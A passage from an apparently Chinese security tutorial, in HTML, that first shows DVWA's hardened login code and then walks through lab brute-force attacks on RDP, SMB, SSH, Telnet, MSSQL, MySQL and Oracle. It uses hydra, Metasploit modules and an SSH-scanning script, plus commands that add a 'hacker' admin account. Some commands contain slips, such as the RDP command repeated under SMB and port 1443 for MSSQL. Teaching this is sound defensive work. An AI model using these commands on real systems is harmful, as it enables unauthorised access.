data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token comment\">// Had the account been locked out since last login?</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$failed_login</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$total_failed_login</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>&lt;em>Warning&lt;/em>: Someone might of been brute forcing your account.&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Number of login attempts: &lt;em><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$failed_login</span><span class=\"token punctuation\">&#125;</span></span>&lt;/em>.&lt;br />Last login attempt was at: &lt;em>$&#123;last_login&#125;&lt;/em>.&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token comment\">// Reset bad login count</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET failed_login = \"0\" WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token comment\">// Give the user some feedback</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;br />&lt;br/>Alternative, the account has been locked because of too many failed logins.&lt;br />If this is the case, &lt;em>please try again in <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$lockout_time</span><span class=\"token punctuation\">&#125;</span></span> minutes&lt;/em>.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token comment\">// Update bad login count</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token comment\">// Set the last login time</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token comment\">// Generate Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><ol>\n<li>POST 登录</li>\n<li>对用户名和密码的输入过滤</li>\n<li>失败三次，锁定输入 15 分钟，如果用户已被锁定、输入的是正确的用户名和密码会提示有人暴力破解你的账户，并重置账户的登录次数</li>\n<li>登录失败时随机睡眠 2-4 秒</li>\n<li>带 token 验证</li>\n</ol>\n<p>目前主流的放爆破措施：</p>\n<ol>\n<li>验证码：图片验证、拼图验证、滑动验证、人机交互验证</li>\n<li>SSO（Single Sign On）：单点登录、统一身份认证</li>\n</ol>\n<h2 id=\"系统认证爆破\"><a class=\"anchor\" href=\"#系统认证爆破\">#</a> 系统认证爆破</h2>\n<h3 id=\"rdp-爆破3389\"><a class=\"anchor\" href=\"#rdp-爆破3389\">#</a> RDP 爆破 (3389)</h3>\n<p>RDP 远程桌面协议 (Remote Desktop Protocol)</p>\n<p>Windows 命令：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 查看用户详情</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>net user administrator</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 修改密码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>net user administrator <span class=\"token number\">123</span>.com</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 开启 GUEST 来宾用户</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>net user guest /active:yes</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 关闭 GUEST 来宾用户</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>net user guest /active:no</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 创建一个用户 hacker 密码为：hacker.123</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>net user hacker hacker.123 /add</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 查看管理组成员</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>net localgroup administrators</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 将 guest 用户添加到管理组</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>net localgroup administrators guest /add</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 将 guest 用户从管理组移除</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>net localgroup administrators guest /del</pre></td></tr></table></figure><p>目标靶机：Windows Server 2008 R2 with SP1 已开启 RDP</p>\n<p><strong>hydra：</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> Administrator <span class=\"token parameter variable\">-P</span> password.txt <span class=\"token number\">192.168</span>.23.135 rdp <span class=\"token number\">3389</span> <span class=\"token parameter variable\">-vV</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711141520562.png\" alt=\"image-20240711141520562\" /></p>\n<p><strong>SNETCracker：</strong>  <a href=\"https://github.com/shack2/SNETCracker\">https://github.com/shack2/SNETCracker</a></p>\n<p><img loading=\"lazy\" data-src=\"image-20240711142054914.png\" alt=\"image-20240711142054914\" /></p>\n<p>** 御剑 RDP 爆破：**<a href=\"https://github.com/foryujian/yujianrdpcrack/tree/5b68c2b0070890f33a1dad1de393706be4372c26\">https://github.com/foryujian/yujianrdpcrack/tree/5b68c2b0070890f33a1dad1de393706be4372c26</a></p>\n<p><img loading=\"lazy\" data-src=\"image-20240711142453500.png\" alt=\"image-20240711142453500\" /></p>\n<h3 id=\"smb爆破445\"><a class=\"anchor\" href=\"#smb爆破445\">#</a> SMB 爆破 (445)</h3>\n<p>SMB（Server Message Block）协议，用于文件共享、打印服务等。如果有 SMB (445)，SMB 爆破的优先级高于 RDP (3389)</p>\n<p><strong>hydra</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> Administrator <span class=\"token parameter variable\">-P</span> password.txt <span class=\"token number\">192.168</span>.23.135 rdp <span class=\"token number\">3389</span> <span class=\"token parameter variable\">-vV</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711153622887.png\" alt=\"image-20240711153622887\" /></p>\n<p><strong>msf</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711154402286.png\" alt=\"image-20240711154402286\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search smb_login</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use <span class=\"token number\">0</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711154541022.png\" alt=\"image-20240711154541022\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711154729057.png\" alt=\"image-20240711154729057\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.135</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> SMBUser administrator</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711154909265.png\" alt=\"image-20240711154909265\" /></p>\n<p><strong>SNETCracker</strong></p>\n<p><img loading=\"lazy\" data-src=\"image-20240711155050674.png\" alt=\"image-20240711155050674\" /></p>\n<h3 id=\"ssh爆破22\"><a class=\"anchor\" href=\"#ssh爆破22\">#</a> SSH 爆破 (22)</h3>\n<p>ssh (Secure Shell) 字面意思安全的 shell，用于远程登录或者文件传输。</p>\n<p>Windows server 2008 R2 安装 openssh：<a href=\"https://github.com/PowerShell/Win32-OpenSSH/releases\">https://github.com/PowerShell/Win32-OpenSSH/releases</a></p>\n<p>下载.msi 安装包直接安装即可</p>\n<p>用 python 编写脚本检查目标主机 ssh 是否设置公钥认证。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> pexpect</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> progressbar</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'22.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    lines <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>attack_ips <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> progressbar<span class=\"token punctuation\">.</span>ProgressBar<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>user <span class=\"token operator\">=</span> <span class=\"token string\">'administrator'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">(</span>lines<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    ssh <span class=\"token operator\">=</span> pexpect<span class=\"token punctuation\">.</span>spawn<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'ssh </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>user<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">@</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>line<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        flag <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>expect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'continue'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'password:'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>isnumeric<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            attack_ips<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">except</span> pexpect<span class=\"token punctuation\">.</span>EOF<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">except</span> pexpect<span class=\"token punctuation\">.</span>TIMEOUT<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">for</span> ip <span class=\"token keyword\">in</span> attack_ips<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ssh.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>railgun</strong></p>\n<p>一款多功能渗透工具，不限于暴力破解</p>\n<p><a href=\"https://github.com/lz520520/railgun\">https://github.com/lz520520/railgun</a></p>\n<p><img loading=\"lazy\" data-src=\"image-20240711195749518.png\" alt=\"image-20240711195749518\" /></p>\n<p><strong>hydra</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> Administrator <span class=\"token parameter variable\">-P</span> password.txt <span class=\"token number\">192.168</span>.23.135 <span class=\"token function\">ssh</span> <span class=\"token number\">22</span> <span class=\"token parameter variable\">-vV</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711200040609.png\" alt=\"image-20240711200040609\" /></p>\n<p><strong>msf</strong></p>\n<p>msf 提供了公钥登录爆破和数字登录爆破，这里使用数字登录爆破 <code>use 0</code></p>\n<p><img loading=\"lazy\" data-src=\"image-20240711200356442.png\" alt=\"image-20240711200356442\" /></p>\n<p>查看需要配置的参数：</p>\n<p><img loading=\"lazy\" data-src=\"image-20240711200616826.png\" alt=\"image-20240711200616826\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.135</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> USERNAME administrator</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711200956957.png\" alt=\"image-20240711200956957\" /></p>\n<h3 id=\"telnet爆破23\"><a class=\"anchor\" href=\"#telnet爆破23\">#</a> Telnet 爆破 (23)</h3>\n<p>Telnet 主要用于远程登录，很危险的一个端口，漏洞对多，建议关闭</p>\n<p><strong>SNETCracker 和 railgun 爆破不出来</strong></p>\n<p><strong>hydra</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> Administrator <span class=\"token parameter variable\">-P</span> /home/kali/password.txt <span class=\"token number\">192.168</span>.23.135 telnet <span class=\"token number\">23</span> <span class=\"token parameter variable\">-vV</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711210744634.png\" alt=\"image-20240711210744634\" /></p>\n<p><strong>msf</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search telnet_login</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use <span class=\"token number\">1</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711212500090.png\" alt=\"image-20240711212500090\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711212554331.png\" alt=\"image-20240711212554331\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> USERNAME administrator</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.135</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711212710139.png\" alt=\"image-20240711212710139\" /></p>\n<h3 id=\"mssql爆破1433\"><a class=\"anchor\" href=\"#mssql爆破1433\">#</a> MSSQL 爆破 (1433)</h3>\n<p>Windows Server 2008 R2 部署 SQL Server 2008 R2 环境参考文章：<a href=\"https://macchiato.ink/web/web_security/mssql_injection_setup/\">https://macchiato.ink/web/web_security/mssql_injection_setup/</a></p>\n<p><strong>hydra</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> sa <span class=\"token parameter variable\">-P</span> /home/kali/password.txt <span class=\"token number\">192.168</span>.23.135 mssql <span class=\"token number\">1443</span> <span class=\"token parameter variable\">-vV</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712150159172.png\" alt=\"image-20240712150159172\" /></p>\n<p><strong>msf</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>search mssql_login</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>use <span class=\"token number\">0</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712151740207.png\" alt=\"image-20240712151740207\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712151907261.png\" alt=\"image-20240712151907261\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.135</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712152025391.png\" alt=\"image-20240712152025391\" /></p>\n<p><strong>railgun</strong></p>\n<p><img loading=\"lazy\" data-src=\"image-20240712152336113.png\" alt=\"image-20240712152336113\" /></p>\n<h3 id=\"mysql爆破3306\"><a class=\"anchor\" href=\"#mysql爆破3306\">#</a> MySQL 爆破 (3306)</h3>\n<p>先检查 mysql 是否开启远程连接</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql <span class=\"token parameter variable\">-h</span> <span class=\"token number\">192.168</span>.23.133 <span class=\"token parameter variable\">-u</span> root <span class=\"token parameter variable\">-p</span></pre></td></tr></table></figure><p>开启了外连：（密码随便输入）</p>\n<p><img loading=\"lazy\" data-src=\"image-20240712190843829.png\" alt=\"image-20240712190843829\" /></p>\n<p>没开启外连：</p>\n<p><img loading=\"lazy\" data-src=\"image-20240712190414236.png\" alt=\"image-20240712190414236\" /></p>\n<p>MySQL 开启和关闭远程连接参考文章：<a href=\"https://www.cnblogs.com/patrick-yeh/p/14303729.html\">https://www.cnblogs.com/patrick-yeh/p/14303729.html</a></p>\n<pre><code class=\"language-cmd\"># 开启mysql远程连接 \nmysql -uroot -p\nuse mysql\n# 8.0以下\nGRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;\n# 8.0以上\n# create user root@'%' identified by '设置的密码';\n# grant all privileges on *.* to root@'%' with grant option;\nFLUSH PRIVILEGES;\n\n# 关闭mysql远程连接\nmysql -uroot -p\nuse mysql;\nDELETE FROM user WHERE User=&quot;root&quot; and Host=&quot;%&quot;;\nFLUSH PRIVILEGES;\n\n</code></pre>\n<p><strong>hydra</strong></p>\n<p><img loading=\"lazy\" data-src=\"image-20240712170350480.png\" alt=\"image-20240712170350480\" /></p>\n<p><strong>railgun</strong></p>\n<p><img loading=\"lazy\" data-src=\"image-20240712170722321.png\" alt=\"image-20240712170722321\" /></p>\n<p><strong>msf</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search mysql_login</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use <span class=\"token number\">0</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712171125501.png\" alt=\"image-20240712171125501\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712185116543.png\" alt=\"image-20240712185116543\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.133</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712185842203.png\" alt=\"image-20240712185842203\" /></p>\n<h3 id=\"oracle爆破1521\"><a class=\"anchor\" href=\"#oracle爆破1521\">#</a> Oracle 爆破 (1521)</h3>\n<p>docker 部署地址：<a href=\"https://hub.docker.com/r/oracleinanutshell/oracle-xe-11g\">https://hub.docker.com/r/oracleinanutshell/oracle-xe-11g</a></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> pull oracleinanutshell/oracle-xe-11g</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># ORACLE_ALLOW_REMOTE=true 开启远程连接</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">1521</span>:1521 <span class=\"token parameter variable\">-e</span> <span class=\"token assign-left variable\">ORACLE_ALLOW_REMOTE</span><span class=\"token operator\">=</span>true oracleinanutshell/oracle-xe-11g</pre></td></tr></table></figure><p><strong>msf</strong></p>\n<p>先破解 SID，自带字典就能直接破解</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search sid_brute</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use <span class=\"token number\">1</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712213634569.png\" alt=\"image-20240712213634569\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712213848188.png\" alt=\"image-20240712213848188\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.129</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712214257326.png\" alt=\"image-20240712214257326\" /></p>\n<p>然后破解 Oracle 数据库</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search oracle_login</pre></td></tr><tr><td 